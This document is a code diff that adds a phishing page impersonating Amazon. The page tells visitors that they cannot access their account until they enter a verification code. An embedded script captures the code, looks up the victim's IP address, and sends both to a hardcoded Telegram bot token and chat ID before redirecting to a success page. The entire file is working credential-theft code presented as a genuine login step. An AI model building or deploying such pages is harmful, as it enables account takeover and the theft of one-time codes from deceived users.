@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon</title>
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="mail.css">
+</head>
+<body>
+    <div id="passage">
+        <h3>You Can't Access Your Account Until You Update</h3>
+    </div>
+    <div id="formsContainer">
+        <div class="emojiContainer">
+            <h2>A verification code has been sent to your account.</h2>
+            <img src="images/img7.png" alt="Image">
+        </div>
+        <form method="post" id="loginform" autocomplete="off">
+            <label for="code" style="font-size: 14px;">A verification code has been sent to your account. <p style="font-size: 12px;">Please enter your verification code</p></label>
+            <input type="text" id="code" name="data[code]" placeholder="Enter code" autocomplete="on" required>
+            <br>
+            <button id="submit" type="submit">Submit</button>
+        </form>
+    </div>   
+
+    <script>
+        document.getElementById("loginform").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Collect the verification code from the form
+            var code = document.getElementById("code").value; // Collect the verification code
+
+            // Get the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip; // Get the user's IP address
+
+                    // Prepare the message to send to Telegram
+                    var message = `Verification Code: ${code}\nIP Address: ${ipAddress}`;
+
+                    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot's token and chat ID
+                    var telegramAPI = `https://api.telegram.org/bot7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;
+
+                    fetch(telegramAPI)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                // Redirect to a different page after successful submission
+                                window.location.href = "success.html"; // Replace with your desired redirect page
+                            } else {
+                                alert("Error: " + data.description); // Show an error message if there was an issue
+                            }
+                        })
+                        .catch(error => {
+                            alert("Error: " + error.message); // Show an error message if the fetch request fails
+                        });
+                })
+                .catch(error => {
+                    alert("Error: " + error.message); // Show an error message if the IP address fetch fails
+                });
+        });
+    </script>
+</body>
+</html>
